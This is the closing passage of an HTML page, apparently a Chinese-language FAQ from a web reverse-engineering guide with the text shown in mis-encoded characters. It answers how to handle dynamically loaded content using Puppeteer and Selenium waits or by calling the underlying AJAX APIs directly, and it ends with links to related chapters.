        <li>ç»“åˆ DevTools æ–­ç‚¹</li>
        <li>ç†è§£æ ¸å¿ƒé€»è¾‘å³å¯ï¼Œæ— éœ€å®Œå…¨è¿˜åŸ</li>
      </ul>

      <p>è¯¦è§: <a href="#04-Advanced-Recipes-javascript-deobfuscation">JavaScript åæ··æ·†</a></p>

      <hr />

      <h3 id="q7-å¦‚ä½•å¤„ç†åŠ¨æ€åŠ è½½çš„å†…å®¹">Q7: å¦‚ä½•å¤„ç†åŠ¨æ€åŠ è½½çš„å†…å®¹ï¼Ÿ</h3>

      <p><strong>A</strong>:</p>

      <p><strong>æ–¹æ³•ä¸€ï¼šPuppeteer ç­‰å¾…åŠ è½½</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="kr">goto</span><span class="p">(</span><span class="s1">&#39;https://example.com&#39;</span><span class="p">);</span>

<span class="c1">// ç­‰å¾…ç‰¹å®šå…ƒç´ å‡ºç°</span>
<span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="nx">waitForSelector</span><span class="p">(</span><span class="s1">&#39;.item&#39;</span><span class="p">);</span>

<span class="c1">// ç­‰å¾…ç½‘ç»œç©ºé—²</span>
<span class="k">await</span><span class="w"> </span><span class="nx">page</span><span class="p">.</span><span class="nx">waitForNetworkIdle</span><span class="p">();</span>
</code></pre>
      </div>

      <p><strong>æ–¹æ³•äºŒï¼šSelenium ç­‰å¾…</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">selenium.webdriver.support.ui</span><span class="w"> </span><span class="kn">import</span> <span class="n">WebDriverWait</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">selenium.webdriver.support</span><span class="w"> </span><span class="kn">import</span> <span class="n">expected_conditions</span> <span class="k">as</span> <span class="n">EC</span>

<span class="n">wait</span> <span class="o">=</span> <span class="n">WebDriverWait</span><span class="p">(</span><span class="n">driver</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span>
<span class="n">element</span> <span class="o">=</span> <span class="n">wait</span><span class="o">.</span><span class="n">until</span><span class="p">(</span><span class="n">EC</span><span class="o">.</span><span class="n">presence_of_element_located</span><span class="p">((</span><span class="n">By</span><span class="o">.</span><span class="n">CLASS_NAME</span><span class="p">,</span> <span class="s1">&#39;item&#39;</span><span class="p">)))</span>
</code></pre>
      </div>

      <p><strong>æ–¹æ³•ä¸‰ï¼šåˆ†æ AJAX è¯·æ±‚</strong></p>

      <ol>
        <li>ç›´æ¥åˆ†æåŠ¨æ€å†…å®¹çš„ API è¯·æ±‚</li>
        <li>è·³è¿‡é¡µé¢æ¸²æŸ“ï¼Œç›´æ¥è¯·æ±‚ API</li>
        <li>æ•ˆç‡æ›´é«˜</li>
      </ol>

      <hr />

      <h2 id="ç›¸å…³ç« èŠ‚">ç›¸å…³ç« èŠ‚</h2>

      <ul>
        <li><a href="#11-Resources-learning-resources">å­¦ä¹ èµ„æº</a></li>
        <li><a href="#11-Resources-github-projects">å¼€æºé¡¹ç›®æ¨è</a></li>
        <li><a href="#03-Basic-Recipes-re-workflow">é€†å‘å·¥ç¨‹å·¥ä½œæµ</a></li>
      </ul>

    </div>
  </div>
</body>

</html>